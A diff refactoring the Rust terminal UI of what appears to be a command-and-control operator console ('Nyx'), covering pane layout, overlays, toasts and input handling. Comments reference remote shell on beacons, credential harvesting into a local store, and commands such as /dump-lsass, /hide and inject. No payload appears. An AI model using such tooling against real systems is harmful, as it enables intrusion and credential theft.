@@ -2,7 +2,7 @@
 //!
 //! Layout:
 //! ```text
-//! ┌─ Nyx  [● status]  beacon: 3 active ────────────────────────────┐
+//! ┌─ Nyx  [● status]  session: 3 active ───────────────────────────┐
 //! │                                                                  │
 //! │  event stream (scrollable: ↑/↓, PgUp/PgDn)                       │
 //! │                                                                  │
@@ -11,7 +11,7 @@
 //! └──────────────────────────────────────────────────────────────────┘
 //! ```
 //! - Typing anything that doesn't start with `/` → shell command on the
-//!   selected beacon (opencode's "just type" feel).
+//!   selected session (opencode's "just type" feel).
 //! - `/` → meta-command; opens a completion popup above the input box.
 //! - `/ls` `/ps` `/creds` → run the underlying shell command, parse the output,
 //!   and pop a fullscreen table overlay (q/Esc returns).
@@ -30,133 +30,89 @@ use crossterm::terminal::{
 };
 use ratatui::backend::CrosstermBackend;
 use ratatui::layout::Rect;
-use ratatui::widgets::ListState;
 use ratatui::Terminal;
 
-use crate::rest::{self, Bridge, Cmd, Level, LogLine, ParseAs, ParsedTable};
+use crate::rest::{self, Bridge, Cmd, Level, LogLine, ParsedTable};
 use crate::types::{CredEntry, FileEntry, ProcEntry, SessionView};
 
 // Pure input/interaction logic lives in its own module for testability.
+mod commands;
 mod config;
 mod credstore;
 mod input;
+mod overlay;
 mod panes;
 mod render;
 mod session_meta;
 mod topology;
 use input::{
-    apply_scroll, destructive_confirm, filter_meta, move_popup_selection, parse_sleep_args,
-    popup_submit_target, Input, PopupMove, ScrollDir, SleepSpec, META_COMMANDS,
+    apply_scroll, filter_meta, move_popup_selection, popup_submit_target, PopupMove, ScrollDir,
 };
+use overlay::{Overlay, Toast};
 use render::render;
 
 /// 默认事件流上限（older dropped）。运行时可用 `/config stream_cap <N>` 改，
 /// 实际值存在 `App::stream_cap`。
 const DEFAULT_STREAM_CAP: usize = 5000;
 
-/// Max entries kept in command history (older dropped). 与 stream_cap 对称，
-/// 防止长时间运行（尤其自动化脚本通过 TUI 发大量命令）导致 history 无界增长。
-const HISTORY_CAP: usize = 2000;
-
-/// What fullscreen overlay table to show (q/Esc dismisses).
-#[derive(Default)]
-pub(super) enum Overlay {
-    #[default]
-    None,
-    Files(Vec<FileEntry>),
-    Procs(Vec<ProcEntry>),
-    Creds(Vec<CredEntry>),
-    Audit(Vec<crate::rest::AuditRow>),
-    Sessions(ListState),
-    /// 全字段会话详情；锚定 session id，render 时从 app.sessions 实时查找。
-    /// 本地数据 overlay（无 worker round-trip）：pending/age/ja3/ja4 等
-    /// SessionView 里一直有但 Sessions 行列表丢弃的字段都在这展示。
-    SessionDetail(String),
-    Image(String, usize),
-    /// 排队中（未投递）的任务表，来自 `GET /api/tasks`。
-    Tasks(Vec<crate::rest::TaskRow>),
-    Profile {
-        loaded: bool,
-        http_get_uri: String,
-        http_post_uri: String,
-        useragent: String,
-    },
-    AuditVerify {
-        ok: bool,
-        broken_at: Option<u64>,
-    },
-}
-
-impl Overlay {
-    fn is_open(&self) -> bool {
-        !matches!(self, Overlay::None)
-    }
-}
-
-/// Pending destructive action awaiting y/N confirmation.
-///
-/// Set when the operator submits `/kill`, `/rm`, `/hide`, `/neutralize`, or
-/// `/dump-lsass` — instead of dispatching immediately we pop a centered
-/// confirm overlay (`render_confirm_overlay`) and only re-dispatch the stored
-/// command once the operator presses `y`.
-pub(super) struct ConfirmAction {
-    /// The full typed line to re-dispatch if confirmed (e.g. `/rm C:\\x`,
-    /// `/hide 1234`). Re-dispatch reuses the normal `submit` path, with
-    /// `App::confirmed` set so the intercept doesn't re-prompt.
-    cmd: String,
-    /// Human-readable headline shown in the overlay body
-    /// (e.g. "Delete file C:\\x on the target?").
-    description: String,
-}
-
-/// Transient toast notification — appears bottom-right, auto-dismisses after
-/// a level-appropriate timeout. Unlike event-stream log lines (which persist
-/// for audit), toasts are eye-level, ephemeral feedback: connection result,
-/// command errors, destructive-action cancellation, etc. Capped at 5 visible
-/// at once (oldest dropped) to prevent flooding the corner.
-pub(super) struct Toast {
-    pub text: String,
-    pub level: Level,
-    pub created: Instant,
-    pub duration: Duration,
-}
-
-impl Toast {
-    /// Build a toast with a default duration: 3s for Info/Ok, 5s for Warn/Err
-    /// (errors deserve more reading time).
-    fn new(text: impl Into<String>, level: Level) -> Self {
-        let duration = match level {
-            Level::Err | Level::Warn => Duration::from_secs(5),
-            _ => Duration::from_secs(3),
-        };
-        Self {
-            text: text.into(),
-            level,
-            created: Instant::now(),
-            duration,
-        }
-    }
-
-    fn is_expired(&self) -> bool {
-        self.created.elapsed() >= self.duration
-    }
-}
-
 // ---- app state -------------------------------------------------------------
 
-pub(super) struct App {
-    bridge: Bridge,
+/// 连接域：team server bridge（worker 双向通道）+ 连接状态。
+pub(crate) struct ConnState {
+    pub(super) bridge: Bridge,
     pub(super) connected: bool,
-    pub(super) sessions: Vec<SessionView>,
-    pub(super) stream: Vec<LogLine>, // event log
-    pub(super) stream_offset: usize, // for scrolling (0 = bottom)
+}
+
+/// 窗格域：tmux 式窗格树 + 焦点 + 每帧重建的屏幕 hit regions + prefix/hover 态。
+pub(crate) struct PaneGroup {
+    /// tmux 式窗格树（可递归分割）。启动默认 [`panes::Pane::default_workspace`]
+    /// （console | sessions 双窗格）。
+    pub(super) tree: panes::Pane,
+    /// 当前焦点叶 id。
+    pub(super) focused: usize,
     /// 每个 Console 窗格独立的滚动偏移量（0 = pinned to bottom）。
     /// 键为窗格 id；不存在则退回到 stream_offset（全局 fallback，兼容旧逻辑）。
-    pub(super) pane_scroll: HashMap<usize, usize>,
-    /// 全局命令历史（所有窗格共享）。↑/↓ 导航时每个窗格各自维护一个
-    /// `hist_idx`（在 PaneState 里），所以多窗格下切换不会互相污染。
-    history: Vec<String>,
-    pub(super) overlay: Overlay,
+    pub(super) scroll: HashMap<usize, usize>,
+    /// 上一帧的终端尺寸（宽 × 高）。render 每帧更新，handle_key 里 move_focus
+    /// 用它替代硬编码的 80×24，保证在任意终端尺寸下焦点移动都能正确找到邻窗格。
+    pub(super) last_frame: Rect,
+    /// 每个窗格的"当前视图 tab"的屏幕 hit region（单个）。render 每帧填充，
+    /// click 时查询：点中它就开关该窗格的视图选择器（view picker）。
+    /// 之前是 6 个 tab 平铺，多分屏时挤爆；改成 1 个紧凑 tab + 点击弹菜单。
+    pub(super) tab_rects: HashMap<usize, Rect>,
+    /// 视图选择器状态：Some(pane_id, ListState) = 该窗格的 picker 正开着，
+    /// None = 关。开窗时 render 在 tab 下方画小 popup 列 6 个视图，点击选择。
+    pub(super) picker: Option<(usize, ratatui::widgets::ListState)>,
+    /// 焦点窗格的屏幕区域（render 每帧记录）。overlay 限制在这个区域内，
+    /// 不再全屏遮挡其他窗格——分屏下操作一个窗格不影响另一个可见。
+    pub(super) focused_rect: Rect,
+    /// Sessions overlay 里每行的屏幕 hit region（render 每帧重建）。
+    /// click 精确命中查询用——避免 List widget 滚动偏移导致算术推算失效。
+    /// 元组第二项 = 该行对应的全局 session 索引（overlay 滚动后可见行不再从 0 起）。
+    pub(super) overlay_rows: Vec<(Rect, usize)>,
+    /// 每个窗格 SessionList 视图的行 hit regions（per-pane）。render 每帧重建。
+    /// 键 = 窗格 id；值 = 该窗格 session 列表每行的 (Rect, session_id)。
+    /// click 点中某行 → 把该窗格的 session 切到对应 session。
+    pub(super) list_rows: HashMap<usize, Vec<(Rect, String)>>,
+    /// 鼠标当前悬停的窗格 id（用于 hover 高亮）。None = 未悬停窗格区域。
+    pub(super) hover: Option<usize>,
+    /// tmux prefix 模式（Ctrl+B 激活）。
+    pub(super) prefix: bool,
+    /// prefix 激活时刻（UX-S5）。用于超时自动复位：按 Ctrl+B 后 2s 内未按有效键
+    /// 则自动退出 prefix 模式，防止操作员分心后误触改布局。None = 无活跃计时。
+    pub(super) prefix_since: Option<Instant>,
+}
+
+/// 会话域：会话列表 + 本地元数据 + age 基线 + 各表视图的最近一次解析缓存。
+pub(crate) struct SessionGroup {
+    pub(super) list: Vec<SessionView>,
+    /// session 本地元数据（~/.nyx/sessions.json）。
+    pub(super) meta: session_meta::SessionStore,
+    /// 每个会话的 age 基线 `(快照时刻, 当时 age_secs)`，用于客户端推算活的 age。
+    /// 故意只在工作真发会话列表（签名变化）时更新：基线 = 真实 age 加本地流逝
+    /// 秒数，每帧重算不会引入抖动，也不污染 session_signature（后者刻意排除
+    /// age_secs 防止 UI 每秒全表重绘）。
+    pub(super) age_baseline: HashMap<String, (Instant, u64)>,
     /// Latest parsed files listing — mirrored from the most recent `/ls` result
     /// so a Files pane view can render it WITHOUT depending on the fullscreen
     /// overlay being open (q/Esc dismisses the overlay but the data persists).
@@ -166,62 +122,34 @@ pub(super) struct App {
     pub(super) procs_view: Vec<ProcEntry>,
     /// Latest parsed credential listing — mirrors `/creds` for the Creds pane.
     pub(super) creds_view: Vec<CredEntry>,
-    /// tmux 式窗格树（可递归分割）。
-    pub(super) pane_tree: panes::Pane,
-    /// 当前焦点叶 id。
-    pub(super) focused_pane: usize,
+}
+
+/// 输入域：全局命令历史。每窗格独立的输入缓冲/光标/popup/历史游标在
+/// [`panes::PaneState`]（窗格树叶节点上），不在这里。
+pub(crate) struct InputState {
+    /// 全局命令历史（所有窗格共享）。↑/↓ 导航时每个窗格各自维护一个
+    /// `hist_idx`（在 PaneState 里），所以多窗格下切换不会互相污染。
+    pub(super) history: Vec<String>,
+}
+
+pub(super) struct App {
+    /// 连接域（bridge + connected）。
+    pub(super) conn: ConnState,
+    /// 窗格域（树/焦点/hit regions/prefix/hover）。
+    pub(super) panes: PaneGroup,
+    /// 会话域（列表/元数据/age 基线/表缓存）。
+    pub(super) sess: SessionGroup,
+    /// 输入域（全局命令历史）。
+    pub(super) input: InputState,
+    /// overlay/confirm/search 状态（定义于 overlay.rs）。
+    pub(super) ovl: overlay::OverlayState,
+    pub(super) stream: Vec<LogLine>, // event log
+    pub(super) stream_offset: usize, // for scrolling (0 = bottom)
     /// 本地配置（alias 表等），启动时从 ~/.nyx/config.json 加载。
     config: config::Config,
     /// 凭据库（~/.nyx/creds.json），/creds 解析出的凭据自动入库。
     creds: credstore::CredStore,
-    /// session 本地元数据（~/.nyx/sessions.json）。
-    pub(super) sessions_meta: session_meta::SessionStore,
-    /// 每个会话的 age 基线 `(快照时刻, 当时 age_secs)`，用于客户端推算活的 age。
-    /// 故意只在工作真发会话列表（签名变化）时更新：基线 = 真实 age 加本地流逝
-    /// 秒数，每帧重算不会引入抖动，也不污染 session_signature（后者刻意排除
-    /// age_secs 防止 UI 每秒全表重绘）。
-    pub(super) age_baseline: HashMap<String, (Instant, u64)>,
-    pub(super) tmux_prefix: bool,
-    /// prefix 激活时刻（UX-S5）。用于超时自动复位：按 Ctrl+B 后 2s 内未按有效键
-    /// 则自动退出 prefix 模式，防止操作员分心后误触改布局。None = 无活跃计时。
-    pub(super) prefix_since: Option<Instant>,
     should_quit: bool,
-    /// 上一帧的终端尺寸（宽 × 高）。render 每帧更新，handle_key 里 move_focus
-    /// 用它替代硬编码的 80×24，保证在任意终端尺寸下焦点移动都能正确找到邻窗格。
-    pub(super) last_frame_size: Rect,
-    /// 每个窗格的"当前视图 tab"的屏幕 hit region（单个）。render 每帧填充，
-    /// click 时查询：点中它就开关该窗格的视图选择器（view picker）。
-    /// 之前是 6 个 tab 平铺，多分屏时挤爆；改成 1 个紧凑 tab + 点击弹菜单。
-    pub(super) view_tab_rect: HashMap<usize, Rect>,
-    /// 视图选择器状态：Some(pane_id, ListState) = 该窗格的 picker 正开着，
-    /// None = 关。开窗时 render 在 tab 下方画小 popup 列 6 个视图，点击选择。
-    pub(super) view_picker: Option<(usize, ratatui::widgets::ListState)>,
-    /// 焦点窗格的屏幕区域（render 每帧记录）。overlay 限制在这个区域内，
-    /// 不再全屏遮挡其他窗格——分屏下操作一个窗格不影响另一个可见。
-    pub(super) focused_pane_rect: Rect,
-    /// Sessions overlay 里每行的屏幕 hit region（render 每帧重建）。
-    /// click 精确命中查询用——避免 List widget 滚动偏移导致算术推算失效。
-    /// 元组第二项 = 该行对应的全局 session 索引（overlay 滚动后可见行不再从 0 起）。
-    pub(super) session_row_rects: Vec<(Rect, usize)>,
-    /// 每个窗格 SessionList 视图的行 hit regions（per-pane）。render 每帧重建。
-    /// 键 = 窗格 id；值 = 该窗格 session 列表每行的 (Rect, session_id)。
-    /// click 点中某行 → 把该窗格的 session 切到对应 beacon。
-    pub(super) pane_session_rows: HashMap<usize, Vec<(Rect, String)>>,
-    /// 鼠标当前悬停的窗格 id（用于 hover 高亮）。None = 未悬停窗格区域。
-    pub(super) hover_pane: Option<usize>,
-    /// 待确认的破坏性命令（非 None 时渲染 confirm overlay，仅响应 y/n/Esc）。
-    /// 详见 [`ConfirmAction`]。
-    pub(super) confirm_action: Option<ConfirmAction>,
-    /// overlay 的滚动偏移（0 = 顶部）。overlay 打开或切换时复位为 0。
-    /// PgUp/PgDn/↑/↓ 在 overlay 打开时调整它（取代 pane 滚动）。
-    pub(super) overlay_scroll: usize,
-    /// 事件流搜索过滤。Some(q) = 只显示含 q 的行（大小写不敏感）。
-    /// 底层 `stream: Vec<LogLine>` 不受影响（仍持有全部行），仅 display 层过滤。
-    /// Ctrl+F 进入搜索输入态，Esc 退出并清空。
-    pub(super) search_query: Option<String>,
-    /// 搜索模式下的实时输入缓冲。Some(_) = 正在敲搜索词（按键直接进这里，
-    /// 不进 pane 输入框）。Enter 落到 `search_query`，Esc 清空两者。
-    pub(super) search_input: Option<String>,
     /// 事件流上限（运行时可调：`/config stream_cap <N>`）。默认 [`DEFAULT_STREAM_CAP`]。
     /// 改小后立即裁剪现有 stream。
     pub(super) stream_cap: usize,
@@ -237,37 +165,41 @@ pub(super) struct App {
 impl App {
     fn new(bridge: Bridge) -> Self {
         Self {
-            bridge,
-            connected: false,
-            sessions: Vec::new(),
+            conn: ConnState {
+                bridge,
+                connected: false,
+            },
+            panes: PaneGroup {
+                tree: panes::Pane::default_workspace(),
+                focused: 1,
+                scroll: HashMap::new(),
+                last_frame: Rect::new(0, 0, 80, 24),
+                tab_rects: HashMap::new(),
+                picker: None,
+                focused_rect: Rect::new(0, 0, 80, 20),
+                overlay_rows: Vec::new(),
+                list_rows: HashMap::new(),
+                hover: None,
+                prefix: false,
+                prefix_since: None,
+            },
+            sess: SessionGroup {
+                list: Vec::new(),
+                meta: session_meta::SessionStore::load(),
+                age_baseline: HashMap::new(),
+                files_view: Vec::new(),
+                procs_view: Vec::new(),
+                creds_view: Vec::new(),
+            },
+            input: InputState {
+                history: Vec::new(),
+            },
+            ovl: overlay::OverlayState::default(),
             stream: Vec::new(),
             stream_offset: 0,
-            pane_scroll: HashMap::new(),
-            history: Vec::new(),
-            overlay: Overlay::default(),
-            files_view: Vec::new(),
-            procs_view: Vec::new(),
-            creds_view: Vec::new(),
-            pane_tree: panes::Pane::single(1),
-            focused_pane: 1,
             config: config::Config::load(),
             creds: credstore::CredStore::load(),
-            sessions_meta: session_meta::SessionStore::load(),
-            age_baseline: HashMap::new(),
-            tmux_prefix: false,
-            prefix_since: None,
             should_quit: false,
-            last_frame_size: Rect::new(0, 0, 80, 24),
-            view_tab_rect: HashMap::new(),
-            view_picker: None,
-            focused_pane_rect: Rect::new(0, 0, 80, 20),
-            session_row_rects: Vec::new(),
-            pane_session_rows: HashMap::new(),
-            hover_pane: None,
-            confirm_action: None,
-            overlay_scroll: 0,
-            search_query: None,
-            search_input: None,
             stream_cap: DEFAULT_STREAM_CAP,
             tick: 0,
             toasts: Vec::new(),
@@ -281,34 +213,34 @@ impl App {
     /// 若 focused_pane 因任何原因失效，fallback 到第一个叶；只有树完全空
     /// （真正的不可恢复状态）才 panic。
     fn focused_state(&self) -> &panes::PaneState {
-        self.pane_tree
-            .leaf_state(self.focused_pane)
+        self.panes.tree
+            .leaf_state(self.panes.focused)
             .or_else(|| {
                 // focused_pane 失效 → 回退到深度优先第一个叶。
-                self.pane_tree
+                self.panes.tree
                     .leaves()
                     .first()
-                    .and_then(|(id, _)| self.pane_tree.leaf_state(*id))
+                    .and_then(|(id, _)| self.panes.tree.leaf_state(*id))
             })
             .expect("pane_tree has no leaves — App invariant violated")
     }
 
     fn focused_state_mut(&mut self) -> &mut panes::PaneState {
         // 先校正 focused_pane（若失效则指向第一个叶），再取 mutable 借用。
-        if self.pane_tree.leaf_state(self.focused_pane).is_none() {
-            if let Some((id, _)) = self.pane_tree.leaves().first() {
-                self.focused_pane = *id;
+        if self.panes.tree.leaf_state(self.panes.focused).is_none() {
+            if let Some((id, _)) = self.panes.tree.leaves().first() {
+                self.panes.focused = *id;
             }
         }
-        self.pane_tree
-            .leaf_state_mut(self.focused_pane)
+        self.panes.tree
+            .leaf_state_mut(self.panes.focused)
             .expect("focused_pane corrected above; tree must have a leaf")
     }
 
     pub(super) fn current_session(&self) -> Option<&SessionView> {
-        self.pane_tree
-            .get_session_id(self.focused_pane)
-            .and_then(|id| self.sessions.iter().find(|s| s.id == id))
+        self.panes.tree
+            .get_session_id(self.panes.focused)
+            .and_then(|id| self.sess.list.iter().find(|s| s.id == id))
     }
 
     /// 客户端推算的会话存活秒数。基线 = 最近一次工作线程真发会话列表时的
@@ -318,7 +250,7 @@ impl App {
     /// `age_secs` 被刻意排除出 signature 一致），而 age 的秒级递增只体现在
     /// 状态栏/详情 overlay 的单点重绘，不触发会话全表重排。
     pub(super) fn age_for(&self, id: &str) -> u64 {
-        match self.age_baseline.get(id) {
+        match self.sess.age_baseline.get(id) {
             Some((t0, base)) => base.saturating_add(t0.elapsed().as_secs()),
             None => 0,
         }
@@ -328,7 +260,7 @@ impl App {
     /// spinner，空窗格据此显示 "fetching…"。聚合所有 beacon 而非仅焦点 session：
     /// 多分屏下一个窗格跑命令时全局指示器也该转。
     pub(super) fn pending_total(&self) -> usize {
-        self.sessions.iter().map(|s| s.pending).sum()
+        self.sess.list.iter().map(|s| s.pending).sum()
     }
 
     fn log(&mut self, text: &str, level: Level) {
@@ -341,17 +273,6 @@ impl App {
             });
         }
         self.trim_stream();
-    }
-
-    /// Push a transient toast notification (bottom-right, auto-dismisses).
-    /// Capped at 5 — when exceeded the oldest is dropped. Call this alongside
-    /// [`log`] for high-visibility feedback (connection result, command errors,
-    /// destructive-action cancellation), or alone for purely transient messages.
-    fn toast(&mut self, text: impl Into<String>, level: Level) {
-        self.toasts.push(Toast::new(text, level));
-        if self.toasts.len() > 5 {
-            self.toasts.remove(0);
-        }
     }
 
     /// 把 stream 裁剪到 `stream_cap` 以内。新增日志 / worker 快照 / 改 cap 后都调它。
@@ -368,27 +289,27 @@ impl App {
         // (~33ms tick) regardless of whether a snapshot arrived, so toasts
         // fade out on time even when the worker is idle.
         self.toasts.retain(|t| !t.is_expired());
-        while let Ok(snap) = self.bridge.snapshots.try_recv() {
-            self.connected = snap.connected;
+        while let Ok(snap) = self.conn.bridge.snapshots.try_recv() {
+            self.conn.connected = snap.connected;
             if !snap.sessions.is_empty() {
                 // keep selection valid
-                if self.pane_tree.get_session_id(self.focused_pane).is_none() {
+                if self.panes.tree.get_session_id(self.panes.focused).is_none() {
                     if let Some(first) = snap.sessions.first() {
-                        self.pane_tree
-                            .set_session_id(self.focused_pane, Some(first.id.clone()));
+                        self.panes.tree
+                            .set_session_id(self.panes.focused, Some(first.id.clone()));
                     }
                 }
-                self.sessions = snap.sessions;
+                self.sess.list = snap.sessions;
                 // Refresh the age baseline for every live session so age_for()
                 // stays accurate between worker polls. 基线 = (现在, 服务器报的 age)。
                 let now = Instant::now();
-                for s in &self.sessions {
-                    self.age_baseline.insert(s.id.clone(), (now, s.age_secs));
+                for s in &self.sess.list {
+                    self.sess.age_baseline.insert(s.id.clone(), (now, s.age_secs));
                 }
                 // 清理已断开 session 的 baseline（P1-1b）：只保留当前仍活着的会话，
                 // 防止长时间运行（beacon 来去）下 age_baseline 无限增长。
-                let live: Vec<String> = self.sessions.iter().map(|s| s.id.clone()).collect();
-                self.age_baseline
+                let live: Vec<String> = self.sess.list.iter().map(|s| s.id.clone()).collect();
+                self.sess.age_baseline
                     .retain(|id, _| live.iter().any(|l| l == id));
             }
             for l in snap.log_lines {
@@ -401,13 +322,13 @@ impl App {
             // (q/Esc); the cached view data persists so a pane keeps its content
             // after the overlay closes.
             if let Some(table) = snap.parsed {
-                self.overlay = match table {
+                self.ovl.overlay = match table {
                     ParsedTable::Files(rows) => {
                         if rows.is_empty() {
                             self.log("(no files parsed)", Level::Warn);
                             Overlay::None
                         } else {
-                            self.files_view = rows.clone();
+                            self.sess.files_view = rows.clone();
                             Overlay::Files(rows)
                         }
                     }
@@ -416,7 +337,7 @@ impl App {
                             self.log("(no processes parsed)", Level::Warn);
                             Overlay::None
                         } else {
-                            self.procs_view = rows.clone();
+                            self.sess.procs_view = rows.clone();
                             Overlay::Procs(rows)
                         }
                     }
@@ -440,7 +361,7 @@ impl App {
                                     Level::Ok,
                                 );
                             }
-                            self.creds_view = rows.clone();
+                            self.sess.creds_view = rows.clone();
                             Overlay::Creds(rows)
                         }
                     }
@@ -508,17 +429,8 @@ impl App {
                     }
                 };
                 // overlay 切换/重开 → 滚动复位到顶部。
-                self.overlay_scroll = 0;
+                self.ovl.scroll = 0;
             }
-        }
-    }
-
-    /// 发命令到 worker。channel 断开（worker panic/退出）时不再静默吞错：
-    /// 对操作命令（shell/bof/inject...）反馈到事件流，让操作员知道任务没发出去。
-    fn send(&mut self, cmd: Cmd) {
-        if self.bridge.cmds.send(cmd).is_err() {
-            self.log("! worker channel closed — command dropped", Level::Err);
-            self.toast("! worker channel closed — command dropped", Level::Err);
         }
     }
 
@@ -526,7 +438,7 @@ impl App {
         // Confirm overlay takes priority over EVERYTHING (overlay, prefix,
         // input typing). When active only y/n/Esc are meaningful; any other
         // key is swallowed so the operator must explicitly confirm or deny.
-        if self.confirm_action.is_some() {
+        if self.ovl.confirm.is_some() {
             // Ctrl+C 仍能紧急退出（即便在确认中），保持"Ctrl+C 永远退出"约定。
             if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('c') {
                 self.should_quit = true;
@@ -537,7 +449,7 @@ impl App {
         }
         // 搜索输入态：按键直接进 search_input，不进 pane 输入框。
         // Ctrl+C 仍能退出（保持全局约定）。Esc 清空并退出，Enter 落到 search_query。
-        if self.search_input.is_some() {
+        if self.ovl.search_input.is_some() {
             if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('c') {
                 self.should_quit = true;
                 return;
@@ -546,15 +458,15 @@ impl App {
             return;
         }
         // Overlay takes priority when open (q/Esc/jk/Enter to pick sessions).
-        if self.overlay.is_open() {
+        if self.ovl.overlay.is_open() {
             self.handle_overlay_key(key);
             return;
         }
         // view picker 开着时拦截键盘：↑↓ 导航、Enter 选、Esc/q 关。
-        if self.view_picker.is_some() {
+        if self.panes.picker.is_some() {
             match key.code {
                 KeyCode::Char('j') | KeyCode::Down => {
-                    if let Some((_, st)) = self.view_picker.as_mut() {
+                    if let Some((_, st)) = self.panes.picker.as_mut() {
                         let n = panes::PaneView::ALL.len();
                         let i = st.selected().unwrap_or(0);
                         st.select(Some((i + 1) % n));
@@ -562,7 +474,7 @@ impl App {
                     return;
                 }
                 KeyCode::Char('k') | KeyCode::Up => {
-                    if let Some((_, st)) = self.view_picker.as_mut() {
+                    if let Some((_, st)) = self.panes.picker.as_mut() {
                         let n = panes::PaneView::ALL.len();
                         let i = st.selected().unwrap_or(0);
                         st.select(Some(i.checked_sub(1).unwrap_or(n - 1)));
@@ -570,17 +482,17 @@ impl App {
                     return;
                 }
                 KeyCode::Enter => {
-                    if let Some((pane_id, st)) = self.view_picker.take() {
+                    if let Some((pane_id, st)) = self.panes.picker.take() {
                         if let Some(i) = st.selected() {
                             if let Some(&v) = panes::PaneView::ALL.get(i) {
-                                self.pane_tree = self.pane_tree.clone().set_view(pane_id, v);
+                                self.panes.tree = self.panes.tree.clone().set_view(pane_id, v);
                             }
                         }
                     }
                     return;
                 }
                 KeyCode::Char('q') | KeyCode::Esc => {
-                    self.view_picker = None;
+                    self.panes.picker = None;
                     return;
                 }
                 _ => {}
@@ -605,24 +517,24 @@ impl App {
                     return;
                 }
                 KeyCode::Char('b') => {
-                    self.tmux_prefix = true;
-                    self.prefix_since = Some(Instant::now());
+                    self.panes.prefix = true;
+                    self.panes.prefix_since = Some(Instant::now());
                     return;
                 }
                 KeyCode::Char('f') => {
                     // 进入事件流搜索模式：search_input 拿到现有 search_query 作为
                     // 初始值（可继续编辑），stream 的 display 层实时过滤。
-                    let prev = self.search_query.clone().unwrap_or_default();
-                    self.search_input = Some(prev);
+                    let prev = self.ovl.search_query.clone().unwrap_or_default();
+                    self.ovl.search_input = Some(prev);
                     return;
                 }
                 _ => {}
             }
         }
 
-        if self.tmux_prefix {
-            self.tmux_prefix = false; // Reset immediately after one keystroke
-            self.prefix_since = None;
+        if self.panes.prefix {
+            self.panes.prefix = false; // Reset immediately after one keystroke
+            self.panes.prefix_since = None;
             // Esc 显式取消 prefix（UX-S5）：之前 Esc 落到 _ 分支被静默吞，违反
             // "Esc = 取消" 通用约定。这里虽已复位，补个清晰语义。
             if key.code == KeyCode::Esc {
@@ -630,31 +542,31 @@ impl App {
             }
             match key.code {
                 KeyCode::Char('v') | KeyCode::Char('%') => {
-                    let new_id = self.pane_tree.next_id();
-                    self.pane_tree = self.pane_tree.clone().split(
-                        self.focused_pane,
+                    let new_id = self.panes.tree.next_id();
+                    self.panes.tree = self.panes.tree.clone().split(
+                        self.panes.focused,
                         panes::SplitDir::Columns,
                         new_id,
                     );
-                    self.focused_pane = new_id;
+                    self.panes.focused = new_id;
                     return;
                 }
                 KeyCode::Char('s') | KeyCode::Char('"') => {
-                    let new_id = self.pane_tree.next_id();
-                    self.pane_tree = self.pane_tree.clone().split(
-                        self.focused_pane,
+                    let new_id = self.panes.tree.next_id();
+                    self.panes.tree = self.panes.tree.clone().split(
+                        self.panes.focused,
                         panes::SplitDir::Rows,
                         new_id,
                     );
-                    self.focused_pane = new_id;
+                    self.panes.focused = new_id;
                     return;
                 }
                 KeyCode::Char('x') => {
-                    let closed = self.focused_pane;
+                    let closed = self.panes.focused;
                     // UX-S4：close 前先记下被关叶的屏幕位置，close 后焦点回退到
                     // 几何上最近的剩余叶（通常是它的兄弟），而不是总跳到第一个叶。
                     // 之前 leaves().first() 会让 2×2 布局关右下角后焦点飞到左上。
-                    let full = self.last_frame_size;
+                    let full = self.panes.last_frame;
                     // 算 pane_area（与 render/click 一致：去掉 statusbar 1 行 + input 3 行）
                     let pane_area = ratatui::layout::Rect {
                         x: full.x,
@@ -662,15 +574,15 @@ impl App {
                         width: full.width,
                         height: full.height.saturating_sub(1 + 3),
                     };
-                    let before = self.pane_tree.layout(pane_area);
+                    let before = self.panes.tree.layout(pane_area);
                     let closed_rect = before.iter().find(|(id, _)| *id == closed).map(|(_, r)| *r);
-                    self.pane_tree = self.pane_tree.clone().close(closed);
+                    self.panes.tree = self.panes.tree.clone().close(closed);
                     // 清理被关窗格的滚动偏移，防止 id 复用时新窗格读到脏偏移（P1-1a）。
-                    self.pane_scroll.remove(&closed);
-                    let remaining = self.pane_tree.layout(pane_area);
-                    self.focused_pane =
+                    self.panes.scroll.remove(&closed);
+                    let remaining = self.panes.tree.layout(pane_area);
+                    self.panes.focused =
                         pick_nearest_leaf(&remaining, closed_rect).unwrap_or_else(|| {
-                            self.pane_tree
+                            self.panes.tree
                                 .leaves()
                                 .first()
                                 .map(|(id, _)| *id)
@@ -679,36 +591,36 @@ impl App {
                     return;
                 }
                 KeyCode::Char('h') | KeyCode::Left => {
-                    let full = self.last_frame_size;
-                    self.focused_pane =
-                        self.pane_tree
-                            .move_focus(self.focused_pane, panes::FocusDir::Left, full);
+                    let full = self.panes.last_frame;
+                    self.panes.focused =
+                        self.panes.tree
+                            .move_focus(self.panes.focused, panes::FocusDir::Left, full);
                     return;
                 }
                 KeyCode::Char('j') | KeyCode::Down => {
-                    let full = self.last_frame_size;
-                    self.focused_pane =
-                        self.pane_tree
-                            .move_focus(self.focused_pane, panes::FocusDir::Down, full);
+                    let full = self.panes.last_frame;
+                    self.panes.focused =
+                        self.panes.tree
+                            .move_focus(self.panes.focused, panes::FocusDir::Down, full);
                     return;
                 }
                 KeyCode::Char('k') | KeyCode::Up => {
-                    let full = self.last_frame_size;
-                    self.focused_pane =
-                        self.pane_tree
-                            .move_focus(self.focused_pane, panes::FocusDir::Up, full);
+                    let full = self.panes.last_frame;
+                    self.panes.focused =
+                        self.panes.tree
+                            .move_focus(self.panes.focused, panes::FocusDir::Up, full);
                     return;
                 }
                 KeyCode::Char('l') | KeyCode::Right => {
-                    let full = self.last_frame_size;
-                    self.focused_pane =
-                        self.pane_tree
-                            .move_focus(self.focused_pane, panes::FocusDir::Right, full);
+                    let full = self.panes.last_frame;
+                    self.panes.focused =
+                        self.panes.tree
+                            .move_focus(self.panes.focused, panes::FocusDir::Right, full);
                     return;
                 }
                 KeyCode::Char(c @ ('1'..='6')) => {
                     if let Some(view) = panes::PaneView::from_index(c as u8 - b'0') {
-                        self.pane_tree = self.pane_tree.clone().set_view(self.focused_pane, view);
+                        self.panes.tree = self.panes.tree.clone().set_view(self.panes.focused, view);
                     }
                     return;
                 }
@@ -716,19 +628,19 @@ impl App {
                 // H=向左扩（左块变大）、L=向右扩（右块变大）、J=向下扩、K=向上扩。
                 // delta 0.05 每次约 5%，连续按可精细调。
                 KeyCode::Char('H') => {
-                    self.pane_tree.adjust_ratio(self.focused_pane, 0.05);
+                    self.panes.tree.adjust_ratio(self.panes.focused, 0.05);
                     return;
                 }
                 KeyCode::Char('L') => {
-                    self.pane_tree.adjust_ratio(self.focused_pane, -0.05);
+                    self.panes.tree.adjust_ratio(self.panes.focused, -0.05);
                     return;
                 }
